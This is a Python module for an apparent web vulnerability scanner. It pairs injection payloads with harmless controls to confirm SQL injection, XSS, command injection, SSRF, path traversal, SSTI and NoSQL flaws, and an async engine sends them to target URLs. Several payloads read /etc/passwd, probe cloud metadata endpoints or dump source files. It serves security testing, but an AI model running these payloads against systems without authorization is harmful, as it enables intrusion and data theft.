"""
Negative Control Payload System v1.0.0-ENTERPRISE
==================================================

Sistema de payloads gémeos - malicioso + inocente equivalente!

Princípio:
- Para cada payload malicioso, enviamos um equivalente inocente
- DIFERENÇA = SINAL (vulnerabilidade real)
- IGUAL = RUÍDO (falso positivo)

Exemplo SQLi:
- Malicioso: 1' OR '1'='1
- Inocente:  1' OR '1'='2

Se ambos dão a mesma resposta → ruído (WAF, app behavior)
Se diferem → SINAL (Boolean-blind SQLi confirmado!)
"""

import asyncio
import hashlib
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Optional, List, Dict, Any, Tuple, Callable
import httpx


class PayloadCategory(Enum):
    """Categories of payloads with negative controls"""
    SQLI_BOOLEAN = "sqli_boolean"
    SQLI_ERROR = "sqli_error"
    SQLI_TIME = "sqli_time"
    XSS = "xss"
    CMDI = "cmdi"
    SSRF = "ssrf"
    LFI = "lfi"
    SSTI = "ssti"
    NOSQL = "nosql"
    XXEPATH = "xpath"


class SignalType(Enum):
    """Type of signal detected"""
    NO_SIGNAL = auto()      # Responses identical - noise
    WEAK_SIGNAL = auto()    # Minor difference - needs verification
    STRONG_SIGNAL = auto()  # Clear difference - likely vulnerability
    CONFIRMED = auto()      # Multiple tests confirm vulnerability


@dataclass
class PayloadPair:
    """
    A pair of payloads: malicious + innocent control
    
    The innocent control should produce different behavior ONLY if 
    the application is vulnerable.
    """
    category: PayloadCategory
    malicious: str
    innocent: str
    description: str
    expected_behavior: str  # What we expect if vulnerable
    
    # Optional detection helpers
    malicious_indicator: Optional[str] = None  # What to look for in malicious response
    innocent_indicator: Optional[str] = None   # What to look for in innocent response
    
    # For time-based
    expected_delay_ms: int = 0
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "category": self.category.value,
            "malicious": self.malicious,
            "innocent": self.innocent,
            "description": self.description,
            "expected_behavior": self.expected_behavior
        }


@dataclass
class ControlTestResult:
    """Result of a negative control test"""
    payload_pair: PayloadPair
    malicious_response: Optional[str]
    innocent_response: Optional[str]
    malicious_status: int
    innocent_status: int
    malicious_time_ms: float
    innocent_time_ms: float
    signal_type: SignalType
    confidence: float  # 0.0 - 1.0
    differences: Dict[str, Any]
    
    def is_signal(self) -> bool:
        """Returns True if this looks like a real vulnerability"""
        return self.signal_type in {SignalType.STRONG_SIGNAL, SignalType.CONFIRMED}
    
    def is_noise(self) -> bool:
        """Returns True if this is likely noise/false positive"""
        return self.signal_type == SignalType.NO_SIGNAL
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "payload_pair": self.payload_pair.to_dict(),
            "malicious_status": self.malicious_status,
            "innocent_status": self.innocent_status,
            "malicious_time_ms": round(self.malicious_time_ms, 2),
            "innocent_time_ms": round(self.innocent_time_ms, 2),
            "signal_type": self.signal_type.name,
            "confidence": round(self.confidence, 2),
            "differences": self.differences
        }


@dataclass 
class NegativeControlBatch:
    """Results of multiple negative control tests"""
    url: str
    parameter: str
    results: List[ControlTestResult]
    overall_signal: SignalType
    overall_confidence: float
    vulnerability_confirmed: bool
    
    def get_signals(self) -> List[ControlTestResult]:
        """Get all results that indicate a signal"""
        return [r for r in self.results if r.is_signal()]
    
    def get_noise(self) -> List[ControlTestResult]:
        """Get all results that indicate noise"""
        return [r for r in self.results if r.is_noise()]
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "results": [r.to_dict() for r in self.results],
            "overall_signal": self.overall_signal.name,
            "overall_confidence": round(self.overall_confidence, 2),
            "vulnerability_confirmed": self.vulnerability_confirmed
        }


class NegativeControlPayloads:
    """
    Negative Control Payload Library
    
    Contains paired payloads: malicious + innocent equivalent
    """
    
    VERSION = "1.0.0-ENTERPRISE"
    
    # SQL Injection - Boolean-based pairs
    SQLI_BOOLEAN_PAIRS = [
        PayloadPair(
            category=PayloadCategory.SQLI_BOOLEAN,
            malicious="' OR '1'='1",
            innocent="' OR '1'='2",
            description="Classic OR-based boolean injection",
            expected_behavior="Malicious returns more data or TRUE condition"
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_BOOLEAN,
            malicious="' AND '1'='1",
            innocent="' AND '1'='2",
            description="AND-based boolean injection",
            expected_behavior="Innocent returns less data or FALSE condition"
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_BOOLEAN,
            malicious="1 OR 1=1",
            innocent="1 OR 1=2",
            description="Numeric OR injection",
            expected_behavior="Different result sets"
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_BOOLEAN,
            malicious="1 AND 1=1",
            innocent="1 AND 1=2",
            description="Numeric AND injection",
            expected_behavior="Innocent returns empty/error"
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_BOOLEAN,
            malicious="' OR 'x'='x",
            innocent="' OR 'x'='y",
            description="String comparison injection",
            expected_behavior="TRUE vs FALSE condition"
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_BOOLEAN,
            malicious="1' OR '1'='1' -- ",
            innocent="1' OR '1'='2' -- ",
            description="Comment-terminated boolean",
            expected_behavior="Comment bypass with boolean"
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_BOOLEAN,
            malicious="1' OR '1'='1'/*",
            innocent="1' OR '1'='2'/*",
            description="C-style comment boolean",
            expected_behavior="Comment bypass variant"
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_BOOLEAN,
            malicious="1))OR((1=1",
            innocent="1))OR((1=2",
            description="Parentheses-heavy injection",
            expected_behavior="Parentheses balancing with boolean"
        ),
    ]
    
    # SQL Injection - Time-based pairs
    SQLI_TIME_PAIRS = [
        PayloadPair(
            category=PayloadCategory.SQLI_TIME,
            malicious="'; WAITFOR DELAY '0:0:5'--",
            innocent="'; WAITFOR DELAY '0:0:0'--",
            description="MSSQL time delay",
            expected_behavior="Malicious delays 5 seconds",
            expected_delay_ms=5000
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_TIME,
            malicious="' AND SLEEP(5)--",
            innocent="' AND SLEEP(0)--",
            description="MySQL SLEEP injection",
            expected_behavior="Malicious delays 5 seconds",
            expected_delay_ms=5000
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_TIME,
            malicious="'; SELECT pg_sleep(5)--",
            innocent="'; SELECT pg_sleep(0)--",
            description="PostgreSQL pg_sleep",
            expected_behavior="Malicious delays 5 seconds",
            expected_delay_ms=5000
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_TIME,
            malicious="1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            innocent="1' AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
            description="MySQL nested SLEEP",
            expected_behavior="Nested delay execution",
            expected_delay_ms=5000
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_TIME,
            malicious="1; SELECT BENCHMARK(10000000,SHA1('test'))--",
            innocent="1; SELECT BENCHMARK(1,SHA1('test'))--",
            description="MySQL BENCHMARK delay",
            expected_behavior="Heavy computation delay",
            expected_delay_ms=3000
        ),
    ]
    
    # SQL Injection - Error-based pairs
    SQLI_ERROR_PAIRS = [
        PayloadPair(
            category=PayloadCategory.SQLI_ERROR,
            malicious="' AND 1=CONVERT(int,(SELECT @@version))--",
            innocent="' AND 1=1--",
            description="MSSQL CONVERT error",
            expected_behavior="Malicious causes type conversion error",
            malicious_indicator="Conversion failed"
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_ERROR,
            malicious="' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
            innocent="' AND 1=1--",
            description="MySQL EXTRACTVALUE error",
            expected_behavior="XML parsing error with version",
            malicious_indicator="XPATH syntax error"
        ),
        PayloadPair(
            category=PayloadCategory.SQLI_ERROR,
            malicious="'||(SELECT ''||version())||'",
            innocent="'||(SELECT '')||'",
            description="PostgreSQL concatenation error",
            expected_behavior="Version in error message"
        ),
    ]
    
    # XSS pairs
    XSS_PAIRS = [
        PayloadPair(
            category=PayloadCategory.XSS,
            malicious="<script>alert('XSS')</script>",
            innocent="&lt;script&gt;alert('XSS')&lt;/script&gt;",
            description="Basic script tag",
            expected_behavior="Malicious executes, innocent escaped",
            malicious_indicator="<script>"
        ),
        PayloadPair(
            category=PayloadCategory.XSS,
            malicious="<img src=x onerror=alert('XSS')>",
            innocent="<img src=x onerror=\"\">",
            description="IMG onerror handler",
            expected_behavior="Event handler executes vs empty",
            malicious_indicator="onerror=alert"
        ),
        PayloadPair(
            category=PayloadCategory.XSS,
            malicious="javascript:alert('XSS')",
            innocent="javascript:void(0)",
            description="JavaScript protocol",
            expected_behavior="Alert vs void",
            malicious_indicator="javascript:alert"
        ),
        PayloadPair(
            category=PayloadCategory.XSS,
            malicious="'-alert('XSS')-'",
            innocent="'-void(0)-'",
            description="Template literal injection",
            expected_behavior="Alert execution in template"
        ),
        PayloadPair(
            category=PayloadCategory.XSS,
            malicious="\"><script>alert('XSS')</script>",
            innocent="\"><!--comment-->",
            description="Attribute breakout",
            expected_behavior="Script execution vs comment"
        ),
    ]
    
    # Command Injection pairs
    CMDI_PAIRS = [
        PayloadPair(
            category=PayloadCategory.CMDI,
            malicious="; echo CMDINJECTION",
            innocent="; echo ",
            description="Semicolon command append",
            expected_behavior="CMDINJECTION appears in output",
            malicious_indicator="CMDINJECTION"
        ),
        PayloadPair(
            category=PayloadCategory.CMDI,
            malicious="| cat /etc/passwd",
            innocent="| cat /dev/null",
            description="Pipe to passwd",
            expected_behavior="Passwd contents vs empty",
            malicious_indicator="root:"
        ),
        PayloadPair(
            category=PayloadCategory.CMDI,
            malicious="`sleep 5`",
            innocent="`sleep 0`",
            description="Backtick sleep",
            expected_behavior="5 second delay",
            expected_delay_ms=5000
        ),
        PayloadPair(
            category=PayloadCategory.CMDI,
            malicious="$(sleep 5)",
            innocent="$(sleep 0)",
            description="Subshell sleep",
            expected_behavior="5 second delay",
            expected_delay_ms=5000
        ),
        PayloadPair(
            category=PayloadCategory.CMDI,
            malicious="& ping -c 5 127.0.0.1 &",
            innocent="& ping -c 1 127.0.0.1 &",
            description="Background ping",
            expected_behavior="Time difference from ping count",
            expected_delay_ms=4000
        ),
        PayloadPair(
            category=PayloadCategory.CMDI,
            malicious="|| echo CMDINJECTION",
            innocent="|| echo ",
            description="OR command injection",
            expected_behavior="Executes on failure",
            malicious_indicator="CMDINJECTION"
        ),
    ]
    
    # SSRF pairs
    SSRF_PAIRS = [
        PayloadPair(
            category=PayloadCategory.SSRF,
            malicious="http://169.254.169.254/latest/meta-data/",
            innocent="http://169.254.169.254/nonexistent12345/",
            description="AWS metadata access",
            expected_behavior="Metadata vs 404",
            malicious_indicator="ami-id"
        ),
        PayloadPair(
            category=PayloadCategory.SSRF,
            malicious="http://127.0.0.1:22",
            innocent="http://127.0.0.1:99999",
            description="Internal port scan",
            expected_behavior="SSH banner vs connection refused"
        ),
        PayloadPair(
            category=PayloadCategory.SSRF,
            malicious="file:///etc/passwd",
            innocent="file:///nonexistent12345",
            description="File protocol",
            expected_behavior="Passwd contents vs error",
            malicious_indicator="root:"
        ),
        PayloadPair(
            category=PayloadCategory.SSRF,
            malicious="http://localhost:6379/",
            innocent="http://localhost:99999/",
            description="Redis detection",
            expected_behavior="Redis response vs connection refused",
            malicious_indicator="REDIS"
        ),
    ]
    
    # LFI pairs  
    LFI_PAIRS = [
        PayloadPair(
            category=PayloadCategory.LFI,
            malicious="../../../../../../etc/passwd",
            innocent="../../../../../../etc/nonexistent12345",
            description="Basic path traversal",
            expected_behavior="Passwd contents vs error",
            malicious_indicator="root:"
        ),
        PayloadPair(
            category=PayloadCategory.LFI,
            malicious="....//....//....//etc/passwd",
            innocent="....//....//....//etc/nonexistent",
            description="Double-dot bypass",
            expected_behavior="Filter bypass to passwd"
        ),
        PayloadPair(
            category=PayloadCategory.LFI,
            malicious="/etc/passwd%00.jpg",
            innocent="/etc/nonexistent%00.jpg",
            description="Null byte injection",
            expected_behavior="Truncation to passwd",
            malicious_indicator="root:"
        ),
        PayloadPair(
            category=PayloadCategory.LFI,
            malicious="php://filter/convert.base64-encode/resource=index.php",
            innocent="php://filter/convert.base64-encode/resource=nonexistent",
            description="PHP filter wrapper",
            expected_behavior="Base64 encoded source vs error"
        ),
    ]
    
    # SSTI pairs
    SSTI_PAIRS = [
        PayloadPair(
            category=PayloadCategory.SSTI,
            malicious="{{7*7}}",
            innocent="{{7*'7'}}",
            description="Jinja2/Twig multiplication",
            expected_behavior="49 vs error/7777777",
            malicious_indicator="49"
        ),
        PayloadPair(
            category=PayloadCategory.SSTI,
            malicious="${7*7}",
            innocent="${7*'7'}",
            description="Freemarker/Velocity",
            expected_behavior="49 vs error"
        ),
        PayloadPair(
            category=PayloadCategory.SSTI,
            malicious="<%= 7*7 %>",
            innocent="<%= '7'*7 %>",
            description="ERB template",
            expected_behavior="49 vs 7777777",
            malicious_indicator="49"
        ),
        PayloadPair(
            category=PayloadCategory.SSTI,
            malicious="#{7*7}",
            innocent="#{'7'*7}",
            description="Ruby template",
            expected_behavior="49 vs 7777777"
        ),
    ]
    
    # NoSQL pairs
    NOSQL_PAIRS = [
        PayloadPair(
            category=PayloadCategory.NOSQL,
            malicious='{"$ne": null}',
            innocent='{"$eq": "nonexistent12345"}',
            description="MongoDB not-equal",
            expected_behavior="All records vs none"
        ),
        PayloadPair(
            category=PayloadCategory.NOSQL,
            malicious='{"$gt": ""}',
            innocent='{"$lt": ""}',
            description="MongoDB comparison",
            expected_behavior="Different result sets"
        ),
        PayloadPair(
            category=PayloadCategory.NOSQL,
            malicious='{"$where": "sleep(5000)"}',
            innocent='{"$where": "1"}',
            description="MongoDB JavaScript sleep",
            expected_behavior="5 second delay",
            expected_delay_ms=5000
        ),
        PayloadPair(
            category=PayloadCategory.NOSQL,
            malicious='{"$regex": ".*"}',
            innocent='{"$regex": "^$"}',
            description="MongoDB regex",
            expected_behavior="Match all vs match empty"
        ),
    ]
    
    # XPath pairs
    XPATH_PAIRS = [
        PayloadPair(
            category=PayloadCategory.XXEPATH,
            malicious="' or '1'='1",
            innocent="' or '1'='2",
            description="XPath boolean",
            expected_behavior="TRUE vs FALSE condition"
        ),
        PayloadPair(
            category=PayloadCategory.XXEPATH,
            malicious="' or count(//*)>0 or '",
            innocent="' or count(//*)=-1 or '",
            description="XPath count injection",
            expected_behavior="Positive count vs impossible"
        ),
    ]
    
    @classmethod
    def get_all_pairs(cls) -> List[PayloadPair]:
        """Get all payload pairs"""
        return (
            cls.SQLI_BOOLEAN_PAIRS +
            cls.SQLI_TIME_PAIRS +
            cls.SQLI_ERROR_PAIRS +
            cls.XSS_PAIRS +
            cls.CMDI_PAIRS +
            cls.SSRF_PAIRS +
            cls.LFI_PAIRS +
            cls.SSTI_PAIRS +
            cls.NOSQL_PAIRS +
            cls.XPATH_PAIRS
        )
    
    @classmethod
    def get_pairs_by_category(cls, category: PayloadCategory) -> List[PayloadPair]:
        """Get payload pairs for a specific category"""
        category_map = {
            PayloadCategory.SQLI_BOOLEAN: cls.SQLI_BOOLEAN_PAIRS,
            PayloadCategory.SQLI_TIME: cls.SQLI_TIME_PAIRS,
            PayloadCategory.SQLI_ERROR: cls.SQLI_ERROR_PAIRS,
            PayloadCategory.XSS: cls.XSS_PAIRS,
            PayloadCategory.CMDI: cls.CMDI_PAIRS,
            PayloadCategory.SSRF: cls.SSRF_PAIRS,
            PayloadCategory.LFI: cls.LFI_PAIRS,
            PayloadCategory.SSTI: cls.SSTI_PAIRS,
            PayloadCategory.NOSQL: cls.NOSQL_PAIRS,
            PayloadCategory.XXEPATH: cls.XPATH_PAIRS,
        }
        return category_map.get(category, [])


class NegativeControlEngine:
    """
    Negative Control Testing Engine
    
    Tests payload pairs and compares responses to distinguish
    SIGNAL (real vulnerability) from NOISE (false positive)
    """
    
    VERSION = "1.0.0-ENTERPRISE"
    
    # Thresholds
    LENGTH_DIFF_THRESHOLD = 0.1      # 10% length difference = significant
    TIME_DIFF_THRESHOLD_MS = 4000    # 4 second time difference = significant
    STATUS_DIFF_SIGNIFICANT = True   # Any status difference is significant
    
    def __init__(
        self,
        timeout: float = 15.0,
        follow_redirects: bool = True,
        max_redirects: int = 5,
        user_agent: str = "PenTestAI-NegativeControl/1.0"
    ):
        self.timeout = timeout
        self.follow_redirects = follow_redirects
        self.max_redirects = max_redirects
        self.user_agent = user_agent
        self._client: Optional[httpx.AsyncClient] = None
    
    async def __aenter__(self):
        self._client = httpx.AsyncClient(
            timeout=self.timeout,
            follow_redirects=self.follow_redirects,
            max_redirects=self.max_redirects,
            headers={"User-Agent": self.user_agent}
        )
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self._client:
            await self._client.aclose()
    
    async def test_pair(
        self,
        url: str,
        parameter: str,
        pair: PayloadPair,
        method: str = "GET",
        inject_point: str = "query",  # query, body, header
        base_params: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None
    ) -> ControlTestResult:
        """
        Test a single payload pair
        
        Args:
            url: Target URL
            parameter: Parameter to inject
            pair: PayloadPair to test
            method: HTTP method
            inject_point: Where to inject (query, body, header)
            base_params: Other parameters to include
            headers: Request headers
            
        Returns:
            ControlTestResult with signal/noise determination
        """
        if not self._client:
            async with self:
                return await self.test_pair(url, parameter, pair, method, inject_point, base_params, headers)
        
        base_params = base_params or {}
        headers = headers or {}
        
        # Test malicious payload
        malicious_response, malicious_status, malicious_time = await self._send_payload(
            url, parameter, pair.malicious, method, inject_point, base_params, headers
        )
        
        # Test innocent payload
        innocent_response, innocent_status, innocent_time = await self._send_payload(
            url, parameter, pair.innocent, method, inject_point, base_params, headers
        )
        
        # Analyze differences
        differences, signal_type, confidence = self._analyze_difference(
            malicious_response, innocent_response,
            malicious_status, innocent_status,
            malicious_time, innocent_time,
            pair
        )
        
        return ControlTestResult(
            payload_pair=pair,
            malicious_response=malicious_response,
            innocent_response=innocent_response,
            malicious_status=malicious_status,
            innocent_status=innocent_status,
            malicious_time_ms=malicious_time,
            innocent_time_ms=innocent_time,
            signal_type=signal_type,
            confidence=confidence,
            differences=differences
        )
    
    async def test_category(
        self,
        url: str,
        parameter: str,
        category: PayloadCategory,
        method: str = "GET",
        inject_point: str = "query",
        base_params: Optional[Dict[str, str]] = None,
        headers: Optional[Dict[str, str]] = None,
        max_pairs: int = 5
    ) -> NegativeControlBatch:
        """
        Test multiple payload pairs from a category
        
        Args:
            url: Target URL
            parameter: Parameter to inject
            category: Payload category
            method: HTTP method
            inject_point: Where to inject
            base_params: Other parameters
            headers: Request headers
            max_pairs: Maximum pairs to test
            
        Returns:
            NegativeControlBatch with all results
        """
        pairs = NegativeControlPayloads.get_pairs_by_category(category)[:max_pairs]
        results: List[ControlTestResult] = []
        
        for pair in pairs:
            try:
                result = await self.test_pair(
                    url, parameter, pair, method, inject_point, base_params, headers
                )
                results.append(result)
                
                # Early exit on strong signal
                if result.signal_type == SignalType.STRONG_SIGNAL:
                    break
                    
            except Exception as e:
                # Continue on errors
                pass
        
        # Determine overall signal
        overall_signal, overall_confidence, confirmed = self._aggregate_results(results)
        
        return NegativeControlBatch(
            url=url,
            parameter=parameter,
            results=results,
            overall_signal=overall_signal,
            overall_confidence=overall_confidence,
            vulnerability_confirmed=confirmed
        )
    
    async def _send_payload(
        self,
        url: str,
        parameter: str,
        payload: str,
        method: str,
        inject_point: str,
        base_params: Dict[str, str],
        headers: Dict[str, str]
    ) -> Tuple[Optional[str], int, float]:
        """Send a request with payload and measure response"""
        
        params = dict(base_params)
        params[parameter] = payload
        
        start_time = time.time()
        
        try:
            if inject_point == "query":
                if method.upper() == "GET":
                    response = await self._client.get(url, params=params, headers=headers)
                else:
                    response = await self._client.request(method, url, params=params, headers=headers)
            elif inject_point == "body":
                response = await self._client.request(method, url, data=params, headers=headers)
            elif inject_point == "header":
                test_headers = dict(headers)
                test_headers[parameter] = payload
                response = await self._client.request(method, url, headers=test_headers)
            else:
                response = await self._client.get(url, params=params, headers=headers)
            
            elapsed_ms = (time.time() - start_time) * 1000
            return (response.text, response.status_code, elapsed_ms)
            
        except httpx.TimeoutException:
            elapsed_ms = (time.time() - start_time) * 1000
            return (None, 0, elapsed_ms)
        except Exception:
            elapsed_ms = (time.time() - start_time) * 1000
            return (None, -1, elapsed_ms)
    
    def _analyze_difference(
        self,
        malicious_response: Optional[str],
        innocent_response: Optional[str],
        malicious_status: int,
        innocent_status: int,
        malicious_time: float,
        innocent_time: float,
        pair: PayloadPair
    ) -> Tuple[Dict[str, Any], SignalType, float]:
        """
        Analyze the difference between malicious and innocent responses
        
        Returns (differences_dict, signal_type, confidence)
        """
        differences: Dict[str, Any] = {}
        points = 0  # Scoring system
        max_points = 100
        
        # 1. Status code difference
        if malicious_status != innocent_status:
            differences["status_diff"] = {
                "malicious": malicious_status,
                "innocent": innocent_status
            }
            points += 30
        
        # 2. Time difference (for time-based)
        time_diff = malicious_time - innocent_time
        differences["time_diff_ms"] = round(time_diff, 2)
        
        if pair.expected_delay_ms > 0:
            # Time-based payload - check for delay
            if time_diff >= pair.expected_delay_ms * 0.8:  # 80% of expected
                points += 50
                differences["time_based_confirmed"] = True
        elif abs(time_diff) > self.TIME_DIFF_THRESHOLD_MS:
            # Unexpected time difference
            points += 20
        
        # 3. Content length difference
        if malicious_response and innocent_response:
            mal_len = len(malicious_response)
            inn_len = len(innocent_response)
            
            if inn_len > 0:
                len_diff_ratio = abs(mal_len - inn_len) / inn_len
                differences["length_diff_ratio"] = round(len_diff_ratio, 3)
                
                if len_diff_ratio > self.LENGTH_DIFF_THRESHOLD:
                    points += 25
            
            # 4. Content hash difference
            mal_hash = hashlib.md5(malicious_response.encode()).hexdigest()[:8]
            inn_hash = hashlib.md5(innocent_response.encode()).hexdigest()[:8]
            
            if mal_hash != inn_hash:
                differences["content_different"] = True
                points += 15
            else:
                differences["content_identical"] = True
                points -= 50  # Strong indicator of noise
            
            # 5. Indicator presence
            if pair.malicious_indicator:
                if pair.malicious_indicator in malicious_response:
                    differences["indicator_found"] = pair.malicious_indicator
                    points += 40
                if pair.malicious_indicator in innocent_response:
                    # Also in innocent = likely noise
                    points -= 30
        
        # Handle null responses
        if malicious_response is None and innocent_response is not None:
            differences["malicious_timeout"] = True
            if pair.expected_delay_ms > 0:
                points += 40  # Timeout on time-based = likely vulnerable
        
        if innocent_response is None and malicious_response is not None:
            differences["innocent_timeout"] = True
            points -= 20  # Innocent timeout is unusual
        
        # Determine signal type
        if points <= 0:
            signal_type = SignalType.NO_SIGNAL
            confidence = 0.0
        elif points < 30:
            signal_type = SignalType.WEAK_SIGNAL
            confidence = points / max_points
        elif points < 60:
            signal_type = SignalType.STRONG_SIGNAL
            confidence = points / max_points
        else:
            signal_type = SignalType.CONFIRMED
            confidence = min(1.0, points / max_points)
        
        differences["score"] = points
        
        return (differences, signal_type, confidence)
    
    def _aggregate_results(
        self,
        results: List[ControlTestResult]
    ) -> Tuple[SignalType, float, bool]:
        """
        Aggregate multiple test results into overall assessment
        
        Returns (signal_type, confidence, confirmed)
        """
        if not results:
            return (SignalType.NO_SIGNAL, 0.0, False)
        
        # Count signals
        strong_signals = sum(1 for r in results if r.signal_type == SignalType.STRONG_SIGNAL)
        confirmed = sum(1 for r in results if r.signal_type == SignalType.CONFIRMED)
        weak_signals = sum(1 for r in results if r.signal_type == SignalType.WEAK_SIGNAL)
        no_signals = sum(1 for r in results if r.signal_type == SignalType.NO_SIGNAL)
        
        # Average confidence
        avg_confidence = sum(r.confidence for r in results) / len(results)
        
        # Determine overall
        if confirmed > 0 or strong_signals >= 2:
            return (SignalType.CONFIRMED, min(1.0, avg_confidence + 0.2), True)
        elif strong_signals > 0:
            return (SignalType.STRONG_SIGNAL, avg_confidence, False)
        elif weak_signals > no_signals:
            return (SignalType.WEAK_SIGNAL, avg_confidence * 0.5, False)
        else:
            return (SignalType.NO_SIGNAL, 0.0, False)


class SmartPayloadSelector:
    """
    Smart Payload Selector
    
    Selects the most appropriate negative control pairs
    based on parameter context
    """
    
    def select_pairs_for_parameter(
        self,
        param_type: str,
        is_reflected: bool = False,
        is_numeric: bool = False,
        location: str = "query"
    ) -> List[PayloadPair]:
        """
        Select appropriate payload pairs based on parameter context
        
        Args:
            param_type: Detected parameter type (from ParameterContextAnalyzer)
            is_reflected: Whether value is reflected in response
            is_numeric: Whether value appears to be numeric
            location: Where parameter is (query, body, header)
            
        Returns:
            List of appropriate PayloadPair objects
        """
        pairs: List[PayloadPair] = []
        
        # SQLi - always test
        if is_numeric:
            pairs.extend(NegativeControlPayloads.SQLI_BOOLEAN_PAIRS[:3])
        else:
            pairs.extend(NegativeControlPayloads.SQLI_BOOLEAN_PAIRS[4:7])
        
        # Time-based SQLi - one pair
        pairs.append(NegativeControlPayloads.SQLI_TIME_PAIRS[1])  # MySQL SLEEP
        
        # XSS - only if reflected
        if is_reflected:
            pairs.extend(NegativeControlPayloads.XSS_PAIRS[:2])
        
        # URL/path types
        if param_type in ("url", "domain", "ip_address"):
            pairs.extend(NegativeControlPayloads.SSRF_PAIRS[:2])
        
        if param_type in ("path", "filename"):
            pairs.extend(NegativeControlPayloads.LFI_PAIRS[:2])
        
        # Command injection - for suspicious params
        if param_type in ("command", "unknown") or location == "header":
            pairs.extend(NegativeControlPayloads.CMDI_PAIRS[:2])
        
        # SSTI - for template-like contexts
        if is_reflected and param_type in ("string", "unknown", "html"):
            pairs.extend(NegativeControlPayloads.SSTI_PAIRS[:2])
        
        return pairs


# Convenience functions
async def test_negative_control(
    url: str,
    parameter: str,
    category: PayloadCategory,
    **kwargs
) -> NegativeControlBatch:
    """Quick negative control test"""
    async with NegativeControlEngine(**kwargs) as engine:
        return await engine.test_category(url, parameter, category)


async def is_signal_or_noise(
    url: str,
    parameter: str,
    malicious_payload: str,
    innocent_payload: str,
    **kwargs
) -> Tuple[SignalType, float]:
    """Quick signal vs noise check for custom payloads"""
    pair = PayloadPair(
        category=PayloadCategory.SQLI_BOOLEAN,
        malicious=malicious_payload,
        innocent=innocent_payload,
        description="Custom test",
        expected_behavior="Custom comparison"
    )
    
    async with NegativeControlEngine(**kwargs) as engine:
        result = await engine.test_pair(url, parameter, pair)
        return (result.signal_type, result.confidence)


# Export
__all__ = [
    "NegativeControlEngine",
    "NegativeControlPayloads",
    "NegativeControlBatch",
    "ControlTestResult",
    "PayloadPair",
    "PayloadCategory",
    "SignalType",
    "SmartPayloadSelector",
    "test_negative_control",
    "is_signal_or_noise"
]
